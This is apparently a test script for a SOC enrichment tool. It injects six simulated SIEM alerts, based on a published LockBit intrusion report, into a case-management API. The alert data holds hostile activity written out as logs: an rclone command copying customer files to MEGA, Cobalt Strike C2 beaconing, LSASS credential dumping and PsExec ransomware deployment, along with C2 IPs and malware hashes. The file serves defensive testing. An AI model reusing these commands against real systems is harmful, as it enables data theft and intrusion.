"""
tests/mock_data/inject_lockbit_alerts.py
=========================================
Injects realistic SOC alerts based on the DFIR Report case:
"Cobalt Strike and a Pair of SOCKS Lead to LockBit Ransomware"
Published: January 27, 2025
Source: https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/

All external IOCs are confirmed in the local IOC database (dfir_report source).
Log descriptions are adapted from the real incident timeline.

Attack chain simulated:
  Alert 1 — Initial Access: Cobalt Strike beacon execution
  Alert 2 — C2 Communication: Beachhead to Cobalt Strike C2
  Alert 3 — Lateral Movement: Remote service creation on domain controller
  Alert 4 — Credential Access: LSASS memory access
  Alert 5 — Exfiltration: Rclone data transfer detected
  Alert 6 — Impact: LockBit ransomware deployment

Usage:
    cd soc_enrichment
    python tests/mock_data/inject_lockbit_alerts.py
"""

import os
import sys
import time
import requests
from dotenv import load_dotenv

load_dotenv()

CASE_PLATFORM_URL     = os.getenv("CASE_PLATFORM_URL", "http://localhost:9000")
CASE_PLATFORM_API_KEY = os.getenv("CASE_PLATFORM_API_KEY")

RUN_ID = int(time.time())

if not CASE_PLATFORM_API_KEY:
    print("ERROR: CASE_PLATFORM_API_KEY not set in .env")
    sys.exit(1)

HEADERS = {
    "Authorization": f"Bearer {CASE_PLATFORM_API_KEY}",
    "Content-Type":  "application/json"
}

LOCKBIT_ALERTS = [
    {
        # ── Alert 1: Initial Access ───────────────────────────────────────────
        # User executed setup_wm.exe masquerading as Windows Media Config
        "title": "Suspicious Executable Download and Execution - Possible Cobalt Strike",
        "type": "external",
        "source": "SIEM",
        "sourceRef": "siem-lockbit-001",
        "description": (
            "SIEM Rule: 'Suspicious Executable Execution from User Profile'\n\n"
            "Jan 28 2024 09:14:32 ENDPOINT-01 Windows Security EventID=4688 "
            "NewProcessName=C:\\Users\\jsmith\\Downloads\\setup_wm.exe "
            "ParentProcessName=C:\\Windows\\explorer.exe "
            "CommandLine=setup_wm.exe\n\n"
            "Jan 28 2024 09:14:33 ENDPOINT-01 Sysmon EventID=3 "
            "Image=C:\\Users\\jsmith\\Downloads\\setup_wm.exe "
            "DestinationIp=31.172.83.162 DestinationPort=443 "
            "Protocol=tcp Initiated=true\n\n"
            "Process setup_wm.exe established outbound HTTPS connection to "
            "31.172.83.162:443 (compdatasystems.com) within 1 second of "
            "execution. File masquerades as Windows Media Configuration Utility "
            "but is not signed by Microsoft. SHA256: "
            "d8b2d883d3b376833fa8e2093e82d0a118ba13b01a2054f8447f57d9fec67030"
        ),
        "severity": 3,
        "tags": ["initial-access", "cobalt-strike", "suspicious-execution"],
        "tlp": 2,
        "observables": [
            {
                "dataType": "ip",
                "data": "10.0.0.50",
                "message": "Source — beachhead endpoint ENDPOINT-01",
                "tags": ["source", "internal", "beachhead"]
            },
            {
                "dataType": "ip",
                "data": "31.172.83.162",
                "message": "Destination — Cobalt Strike C2 (compdatasystems.com)",
                "tags": ["destination", "external", "c2"]
            },
            {
                "dataType": "hash",
                "data": "d8b2d883d3b376833fa8e2093e82d0a118ba13b01a2054f8447f57d9fec67030",
                "message": "setup_wm.exe — Cobalt Strike beacon loader",
                "tags": ["malware-hash", "cobalt-strike", "loader"]
            },
            {
                "dataType": "mail",
                "data": "alex.wilber@example-corp.com",
                "message": "User who executed the file",
                "tags": ["user", "it-admin", "privileged"]
            }
        ]
    },
    {
        # ── Alert 2: C2 Communication ─────────────────────────────────────────
        # Persistent C2 beaconing to second Cobalt Strike server
        "title": "Persistent Outbound C2 Beaconing - Cobalt Strike Detected",
        "type": "external",
        "source": "SIEM",
        "sourceRef": "siem-lockbit-002",
        "description": (
            "SIEM Rule: 'Repeated Outbound Connections to Single External IP'\n\n"
            "Jan 28 2024 10:45:00 FILESERVER-01 Sysmon EventID=3 "
            "Image=C:\\Windows\\System32\\svchost.exe "
            "DestinationIp=159.100.14.254 DestinationPort=443 "
            "Protocol=tcp\n"
            "Jan 28 2024 10:46:03 FILESERVER-01 Sysmon EventID=3 "
            "DestinationIp=159.100.14.254 DestinationPort=443\n"
            "Jan 28 2024 10:47:05 FILESERVER-01 Sysmon EventID=3 "
            "DestinationIp=159.100.14.254 DestinationPort=443\n\n"
            "svchost.exe on FILESERVER-01 making periodic HTTPS connections to "
            "159.100.14.254:443 (retailadvertisingservices.com) every ~60 seconds "
            "over a 2-hour period. Beacon interval consistent with Cobalt Strike "
            "default sleep configuration. Process injection from PowerShell "
            "observed 5 minutes prior to first connection."
        ),
        "severity": 4,
        "tags": ["c2-beaconing", "cobalt-strike", "process-injection", "lateral-movement"],
        "tlp": 2,
        "observables": [
            {
                "dataType": "ip",
                "data": "10.0.0.55",
                "message": "Source — file server FILESERVER-01",
                "tags": ["source", "internal", "server"]
            },
            {
                "dataType": "ip",
                "data": "159.100.14.254",
                "message": "Destination — second Cobalt Strike C2 (retailadvertisingservices.com)",
                "tags": ["destination", "external", "c2", "cobalt-strike"]
            }
        ]
    },
    {
        # ── Alert 3: Lateral Movement via Remote Service ───────────────────────
        # Remote service creation on domain controller
        "title": "Remote Service Creation on Domain Controller - Possible Lateral Movement",
        "type": "external",
        "source": "SIEM",
        "sourceRef": "siem-lockbit-003",
        "description": (
            "SIEM Rule: 'Remote Service Created on Critical Asset'\n\n"
            "Jan 28 2024 09:45:17 DC-01 Windows Security EventID=7045 "
            "ServiceName=PSEXESVC "
            "ServiceFileName=C:\\Windows\\PSEXESVC.exe "
            "ServiceType=UserModeService ServiceStartType=Demand\n\n"
            "Jan 28 2024 09:45:18 DC-01 Windows Security EventID=4624 "
            "LogonType=3 SubjectUserName=jsmith "
            "IpAddress=10.0.0.50 WorkstationName=ENDPOINT-01\n\n"
            "Jan 28 2024 09:45:19 DC-01 Sysmon EventID=11 "
            "Image=C:\\Windows\\PSEXESVC.exe "
            "TargetFilename=C:\\Windows\\System32\\svcmc.dll\n\n"
            "Remote service PSEXESVC created on domain controller DC-01 from "
            "beachhead ENDPOINT-01 (10.0.0.50) using account jsmith. "
            "DLL svcmc.dll dropped immediately after service creation — "
            "consistent with SystemBC proxy deployment."
        ),
        "severity": 4,
        "tags": ["lateral-movement", "remote-service", "domain-controller", "systembc"],
        "tlp": 3,
        "observables": [
            {
                "dataType": "ip",
                "data": "10.0.0.50",
                "message": "Source — beachhead ENDPOINT-01",
                "tags": ["source", "internal", "beachhead"]
            },
            {
                "dataType": "ip",
                "data": "10.0.0.12",
                "message": "Destination — domain controller DC-01",
                "tags": ["destination", "internal", "critical-asset", "domain-controller"]
            },
            {
                "dataType": "hash",
                "data": "2389b3978887ec1094b26b35e21e9c77826d91f7fa25b2a1cb5ad836ba2d7ec4",
                "message": "svc.dll — SystemBC proxy C2 component",
                "tags": ["malware-hash", "systembc", "proxy"]
            },
            {
                "dataType": "mail",
                "data": "alex.wilber@example-corp.com",
                "message": "Compromised account used for lateral movement",
                "tags": ["user", "it-admin", "compromised"]
            }
        ]
    },
    {
        # ── Alert 4: Credential Access via LSASS ──────────────────────────────
        # LSASS memory access for credential dumping
        "title": "LSASS Memory Access Detected - Possible Credential Dumping",
        "type": "external",
        "source": "SIEM",
        "sourceRef": "siem-lockbit-004",
        "description": (
            "SIEM Rule: 'LSASS Memory Access by Non-System Process'\n\n"
            "Jan 28 2024 09:52:44 ENDPOINT-01 Sysmon EventID=10 "
            "SourceImage=C:\\Windows\\System32\\wuauclt.exe "
            "TargetImage=C:\\Windows\\System32\\lsass.exe "
            "GrantedAccess=0x1fffff "
            "CallTrace=UNKNOWN|C:\\Windows\\SYSTEM32\\ntdll.dll\n\n"
            "Jan 28 2024 09:52:45 ENDPOINT-01 Sysmon EventID=10 "
            "SourceImage=C:\\Windows\\System32\\wuauclt.exe "
            "TargetImage=C:\\Windows\\System32\\lsass.exe "
            "GrantedAccess=0x1010\n\n"
            "wuauclt.exe (injected by Cobalt Strike beacon) accessed LSASS "
            "memory with full access rights (0x1fffff). CallTrace shows UNKNOWN "
            "region indicating injected shellcode. Access pattern consistent "
            "with Mimikatz or similar credential dumping tool running in memory."
        ),
        "severity": 4,
        "tags": ["credential-access", "lsass", "credential-dumping", "cobalt-strike"],
        "tlp": 3,
        "observables": [
            {
                "dataType": "ip",
                "data": "10.0.0.50",
                "message": "Affected host — ENDPOINT-01 (beachhead)",
                "tags": ["source", "internal", "beachhead"]
            },
            {
                "dataType": "mail",
                "data": "alex.wilber@example-corp.com",
                "message": "Logged-in user at time of LSASS access",
                "tags": ["user", "it-admin", "privileged"]
            }
        ]
    },
    {
        # ── Alert 5: Data Exfiltration via Rclone ─────────────────────────────
        # Large scale data exfiltration using Rclone to MEGA
        "title": "Large Scale Data Exfiltration via Rclone - MEGA Storage",
        "type": "external",
        "source": "SIEM",
        "sourceRef": "siem-lockbit-005",
        "description": (
            "SIEM Rule: 'Unusual Large Outbound Data Transfer'\n\n"
            "Jan 28 2024 14:33:12 FILESERVER-01 Sysmon EventID=1 "
            "Image=C:\\Users\\Public\\Music\\rclone.exe "
            "CommandLine=rclone.exe copy E:\\customers mega:backup/customers "
            "-q --ignore-existing --multi-thread-streams 12 --transfers 12\n\n"
            "Jan 28 2024 14:33:15 FILESERVER-01 NetFlow "
            "SrcIP=10.0.0.55 DstIP=195.2.70.38 DstPort=443 "
            "BytesSent=2147483648 Duration=2400s\n\n"
            "Jan 28 2024 14:33:15 FILESERVER-01 NetFlow "
            "SrcIP=10.0.0.55 DstIP=91.142.74.28 DstPort=30001 "
            "BytesSent=524288 Protocol=tcp\n\n"
            "rclone.exe executed from non-standard path C:\\Users\\Public\\Music\\. "
            "2GB+ transferred to MEGA cloud storage over 40 minutes. "
            "Concurrent connection to GhostSOCKS C2 at 91.142.74.28:30001 "
            "indicates exfiltration tunneled through established proxy."
        ),
        "severity": 4,
        "tags": ["exfiltration", "rclone", "data-theft", "ghostsocks"],
        "tlp": 3,
        "observables": [
            {
                "dataType": "ip",
                "data": "10.0.0.55",
                "message": "Source — file server FILESERVER-01",
                "tags": ["source", "internal", "server"]
            },
            {
                "dataType": "ip",
                "data": "91.142.74.28",
                "message": "GhostSOCKS C2 — proxy tunnel used during exfiltration",
                "tags": ["destination", "external", "c2", "ghostsocks"]
            },
            {
                "dataType": "hash",
                "data": "b4ad5df385ee964fe9a800f2cdaa03626c8e8811ddb171f8e821876373335e63",
                "message": "svchosts.exe — GhostSOCKS proxy binary",
                "tags": ["malware-hash", "ghostsocks", "proxy"]
            }
        ]
    },
    {
        # ── Alert 6: Ransomware Deployment ────────────────────────────────────
        # LockBit ransomware deployed via PsExec across network
        "title": "Ransomware Deployment Detected - LockBit via PsExec",
        "type": "external",
        "source": "SIEM",
        "sourceRef": "siem-lockbit-006",
        "description": (
            "SIEM Rule: 'Mass Remote Process Execution Across Multiple Hosts'\n\n"
            "Feb 07 2024 03:14:22 BACKUPSERVER-01 Windows Security EventID=7045 "
            "ServiceName=PSEXESVC "
            "ServiceFileName=%WINDIR%\\temp\\ds.exe\n\n"
            "Feb 07 2024 03:14:23 FILESERVER-01 Windows Security EventID=4688 "
            "NewProcessName=C:\\Windows\\temp\\ds.exe "
            "ParentProcessName=C:\\Windows\\PSEXESVC.exe\n\n"
            "Feb 07 2024 03:14:25 ENDPOINT-02 Sysmon EventID=1 "
            "Image=C:\\Windows\\temp\\ds.exe "
            "CommandLine=ds.exe -pass REDACTED\n\n"
            "Feb 07 2024 03:15:01 Multiple hosts — File extension changes "
            "detected across E:\\ share. Files renamed with .lockbit extension. "
            "Desktop wallpaper modification observed on all affected hosts.\n\n"
            "ds.exe deployed via PsExec from BACKUPSERVER-01 to multiple hosts "
            "simultaneously. Mass file encryption beginning across network shares. "
            "LockBit ransomware note detected. TTR: 239 hours from initial access."
        ),
        "severity": 4,
        "tags": ["ransomware", "lockbit", "impact", "psexec", "mass-deployment"],
        "tlp": 3,
        "observables": [
            {
                "dataType": "ip",
                "data": "10.0.0.60",
                "message": "Source — backup server used as ransomware staging host",
                "tags": ["source", "internal", "server", "staging"]
            },
            {
                "dataType": "ip",
                "data": "10.0.0.12",
                "message": "Target — domain controller",
                "tags": ["destination", "internal", "critical-asset"]
            },
            {
                "dataType": "ip",
                "data": "185.236.232.20",
                "message": "SystemBC C2 — active throughout ransomware deployment",
                "tags": ["external", "c2", "systembc"]
            },
            {
                "dataType": "mail",
                "data": "adele.vance@example-corp.com",
                "message": "Finance user — files on shared drive encrypted",
                "tags": ["user", "finance", "victim"]
            }
        ]
    },
]


def create_alert(alert: dict) -> dict:
    observables = alert.pop("observables", [])
    # Per-run sourceRef suffix: case management platform rejects duplicates with HTTP 400, so a
    # fixed sourceRef would make this script single-use. No pipeline reads
    # sourceRef (routing is by tag), so this is display-only.
    alert = {**alert, "sourceRef": f"{alert['sourceRef']}-{RUN_ID}"}
    response = requests.post(
        f"{CASE_PLATFORM_URL}/api/v1/alert",
        headers=HEADERS,
        json=alert,
        timeout=10
    )
    # Surface case management platform's own message instead of a bare "400 Bad Request".
    if response.status_code >= 400:
        raise RuntimeError(
            f"HTTP {response.status_code} from case management platform: {response.text[:400]}"
        )
    created  = response.json()
    alert_id = created["_id"]

    for obs in observables:
        obs_resp = requests.post(
            f"{CASE_PLATFORM_URL}/api/v1/alert/{alert_id}/observable",
            headers=HEADERS,
            json=obs,
            timeout=10
        )
        if obs_resp.status_code not in (200, 201):
            print(f"  ⚠ Observable failed: {obs['data'][:40]} — {obs_resp.text[:80]}")

    return created


def run():
    print(f"Injecting LockBit intrusion scenario ({len(LOCKBIT_ALERTS)} alerts)")
    print(f"Based on DFIR Report case TB27138 — January 2025")
    print(f"Target: {CASE_PLATFORM_URL}\n")

    success = 0
    failed  = 0

    for i, alert in enumerate(LOCKBIT_ALERTS, 1):
        title = alert.get("title", "")
        try:
            created  = create_alert(alert)
            alert_id = created["_id"]
            print(f"  ✅ [{i}/{len(LOCKBIT_ALERTS)}] {title[:60]}")
            print(f"       ID: {alert_id} | Severity: {created.get('severityLabel')}")
            success += 1
        except Exception as exc:
            print(f"  ❌ [{i}/{len(LOCKBIT_ALERTS)}] {title[:60]}")
            print(f"       Error: {exc}")
            failed += 1

    print(f"\nDone — {success} created, {failed} failed")
    print(f"\nView at: {CASE_PLATFORM_URL}/alerts")
    print(f"Login:   analyst@example.local")


if __name__ == "__main__":
    run()